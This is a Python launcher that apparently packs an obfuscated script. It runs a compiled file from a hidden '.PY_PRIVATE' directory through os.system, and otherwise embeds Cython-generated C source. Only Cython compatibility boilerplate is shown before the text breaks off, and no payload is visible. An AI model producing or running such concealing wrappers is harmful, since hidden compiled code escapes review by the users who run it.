
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250815100204469"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
